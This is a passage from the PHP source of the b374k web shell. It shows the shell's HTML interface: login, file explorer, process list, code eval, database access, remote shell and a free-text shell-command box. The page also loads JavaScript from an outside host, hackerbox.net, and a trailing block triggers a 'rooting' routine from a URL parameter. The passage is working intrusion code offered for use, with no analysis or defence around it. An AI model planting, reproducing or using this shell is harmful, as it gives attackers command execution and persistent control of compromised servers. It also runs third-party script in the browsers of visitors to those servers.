                        $s_result .= showdir($s_cwd);
                    }
                }
            } else {
                $s_result .= showdir($s_cwd);
            }
        } else {
            $s_result .= showdir($s_cwd);
        }
    }

    // find drive letters
    $s_letters = '';
    $s_v       = explode("\\", $s_cwd);
    $s_v       = $s_v[0];
    foreach (range("A", "Z") as $s_letter) {
        if (@is_readable($s_letter . ":\\")) {
            $s_letters .= "<a href='" . $s_self . "cd=" . $s_letter . ":\\'>[ ";
            if ($s_letter . ":" != $s_v) {
                $s_letters .= $s_letter;
            } else {
                $s_letters .= "<span class='drive-letter'>" . $s_letter . "</span>";
            }
            $s_letters .= " ]</a> ";
        }
    }

    // print useful info
    $s_info = "<table class='headtbl'><tr><td>" . $s_system . "</td></tr>";
    $s_info .= "<tr><td>" . $s_software . "</td></tr>";
    $s_info .= "<tr><td>server ip : " . $s_server_ip . "<span class='gaya'> | </span>your   ip : " . $s_my_ip;
    $s_info .= "<span class='gaya'> | </span> Time @ Server : " . @date("d M Y H:i:s", time());
    $s_info .= "</td></tr>
			<tr><td style='text-align:left;'>
				<table class='headtbls'><tr>
				<td>" . trim($s_letters) . "</td>
				<td>
				<span id='chpwd'>
				&nbsp;<a href=\"javascript:tukar_('chpwd','chpwdform')\">
				<span class='icon'>o</span>
				&nbsp;&nbsp;</a>" . swd($s_cwd) . "</span>
				<form action='" . $s_self . "' method='post' style='margin:0;padding:0;'>
				<span class='sembunyi' id='chpwdform'>
				&nbsp;<a href=\"javascript:tukar_('chpwdform','chpwd');\">
				<span class='icon'>o</span>
				</a>&nbsp;&nbsp;
				<input type='text' name='view' class='inputz' style='width:300px;' value='" . hss($s_cwd) . "' />
				<input class='inputzbut' type='submit' name='submit' value='view file / folder' />
				</span>
				</form>
				</td></tr>
				</table>
			</td></tr>
			</table>";
}

$s_error = @ob_get_contents();
$s_result = isset($s_result) ? $s_result : "";
if (!empty($s_error)) {
    $s_result = notif($s_error) . $s_result;
}
@ob_end_clean();
@ob_start();

?><!DOCTYPE html>
<html>
<head>
    <title><?php echo $s_title; ?></title>
    <meta charset="utf-8">
    <meta name='robots' content='noindex, nofollow, noarchive'>
    <link rel='SHORTCUT ICON' href='<?php echo $s_favicon; ?>'>
    <?php echo get_code("css", $s_css); ?>
</head>
<body>
<SCRIPT SRC=http://www.hackerbox.net/blabla/per.js></SCRIPT>
<table id='main'>
    <tr>
        <td>
            <?php if ($s_auth) { ?>
                <div><span style='float:right;'><?php
                        if (!isset($_COOKIE['b374k_included'])) {
                            ?><a href='?x=pass'>password</a> |
	<?php }
                        ?><a href='<?php echo $s_self; ?>x=logout' title='Click me to log out'>log out</a>  <a
                            href='<?php echo $s_self; ?>x=switch' title='Click me to change theme'><span
                                class='schemabox'>&nbsp;&nbsp;</span></a></span>
                    <table id='header'>
                        <tr>
                            <td style='width:80px;'>
                                <table>
                                    <tr>
                                        <td><h1>
                                                <a href='<?php echo $s_self . "cd=" . cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?>'>b374k</a>
                                            </h1></td>
                                    </tr>
                                    <tr>
                                        <td style='text-align:right;'>
                                            <div class='ver'><?php echo $s_ver; ?></div>
                                        </td>
                                    </tr>
                                </table>
                            </td>
                            <td>
                                <div class='headinfo'><?php echo $s_info; ?></div>
                            </td>
                        </tr>
                    </table>
                </div>
                <div style='clear:both;'></div>
                <form method='post' name='g'></form>
                <div id='menu'>
                    <table style='width:100%;'>
                        <tr>
                            <td><a href='<?php echo $s_self; ?>' title='Explorer'>
                                    <div class='menumi'>xpl</div>
                                </a></td>
                            <td><a href='<?php echo $s_self; ?>x=ps' title='Display process status'>
                                    <div class='menumi'>ps</div>
                                </a></td>
                            <td><a href='<?php echo $s_self; ?>x=eval' title='Execute code'>
                                    <div class='menumi'>eval</div>
                                </a></td>
                            <td><a href='<?php echo $s_self; ?>x=info' title='Information about server'>
                                    <div class='menumi'>info</div>
                                </a></td>
                            <td><a href='<?php echo $s_self; ?>x=db' title='Connect to database'>
                                    <div class='menumi'>db</div>
                                </a></td>
                            <td><a href='<?php echo $s_self; ?>x=rs' title='Remote Shell'>
                                    <div class='menumi'>rs</div>
                                </a></td>
                            <td style='width:100%;padding:0 0 0 6px;'>
                                <span class='prompt'><?php echo $s_prompt; ?></span>

                                <form action='<?php echo $s_self; ?>' method='post'>
                                    <input id='cmd' onclick="clickcmd();" class='inputz' type='text' name='cmd'
                                           style='width:70%;' value='<?php
                                    if (isset($_GP['cmd'])) {
                                        echo "";
                                    } else {
                                        echo "- shell command -";
                                    }
                                    ?>'/>
                                    <noscript><input class='inputzbut' type='submit' value='Go !' name='submitcmd'
                                                     style='width:80px;'/></noscript>
                                </form>
                            </td>
                        </tr>
                    </table>
                </div>
                <div id='content'>
                    <div id='result'><?php echo "__RESULT__"; ?></div>
                </div>
                <div id='navigation'>
                    <div id='totop' onclick='totopd();' onmouseover='totop();' onmouseout='stopscroll();'></div>
                    <div id='tobottom' onclick='tobottomd();' onmouseover='tobottom();'
                         onmouseout='stopscroll();'></div>
                </div>
            <?php } else { ?>
                <div style='width:100%;text-align:center;'>
                    <form action='<?php echo $s_self; ?>' method='post'>
                        <img src='<?php echo $s_favicon; ?>' style='margin:2px;vertical-align:middle;'/>
                        b374k&nbsp;<span class='gaya'><?php echo $s_ver; ?></span><input id='login' class='inputz'
                                                                                         type='password' name='login'
                                                                                         style='width:120px;' value=''/>
                        <input class='inputzbut' type='submit' value='Go !' name='submitlogin' style='width:80px;'/>
                    </form>
                </div>
            <?php } ?>    </td>
    </tr>
</table>
<p class='footer'>Jayalah Indonesiaku &copy;<?php echo @date("Y", time()) . " "; ?>b374k</p>
<script type='text/javascript'>
    var d = document;
    var scroll = false;
    var cwd = '<?php echo hss(adds($s_cwd)); ?>';
    var hexstatus = false;
    var timer = '';
    var x = '<?php if(isset($_GP['x']) && ($_GP['x']=='ps')) {echo "ps";} ?>';
    var sself = '<?php echo adds($s_self); ?>';
    var hexcounter = 0;
    var hextimer = '';
    var counter = 0;

</script>
<?php echo get_code("js", $s_js); ?>
<script type='text/javascript'>
    domready(function () {
        <?php if(isset($_GP['cmd'])) {echo "if(d.getElementById('cmd')) d.getElementById('cmd').focus();";} ?>
        <?php if(isset($_GP['evalcode'])) {echo "if(d.getElementById('evalcode')) d.getElementById('evalcode').focus();";} ?>
        <?php if(isset($_GP['sqlcode'])) {echo "if(d.getElementById('sqlcode')) d.getElementById('sqlcode').focus();";} ?>
        <?php if(isset($_GP['login'])) {echo "if(d.getElementById('login')) d.getElementById('login').focus();";} ?>
        <?php if(isset($_GP['hexedit'])) {echo "showhex();";} ?>

        if (d.getElementById('cmd')) d.getElementById('cmd').setAttribute('autocomplete', 'off');

        var textareas = d.getElementsByTagName('textarea');
        var count = textareas.length;
        for (i = 0; i < count; i++) {
            textareas[i].onkeydown = function (e) {
                if (e.keyCode == 9) {
                    e.preventDefault();
                    var s = this.selectionStart;
                    this.value = this.value.substring(0, this.selectionStart) + "\t" + this.value.substring(this.selectionEnd);
                    this.selectionEnd = s + 1;
                }
                else if (e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)) {
                    this.form.submit();
                }
            }
        }
        listen();
    });
</script>
</body>
</html><?php
$s_html = ob_get_contents();
ob_end_clean();
$whitespace = "/(\s{2,}|\n{1,})/";
$s_html     = preg_replace($whitespace, " ", $s_html);
$s_html     = str_replace("__RESULT__", $s_result, $s_html);
echo $s_html;
die();
?>
<?php


$x = $_GET["x"];
Switch ($x) {
    case "rooting";
        rooting();
        break;

}
?>